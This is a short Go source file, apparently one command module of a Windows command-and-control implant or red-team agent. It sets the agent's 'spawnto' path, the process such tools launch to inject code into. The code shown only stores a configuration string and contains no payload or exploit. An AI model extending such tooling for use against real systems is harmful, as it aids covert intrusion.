//go:build windows
// +build windows

package main

import (
	"encoding/json"
	"fmt"
)

type SpawntoParams struct {
	Path string `json:"path"`
}

func cmdSpawnto(raw json.RawMessage, a *Agent) string {
	var p SpawntoParams
	if err := json.Unmarshal(raw, &p); err != nil {
		return "error: " + err.Error()
	}

	a.Spawnto = p.Path
	return fmt.Sprintf("spawnto set to: %s", p.Path)
}
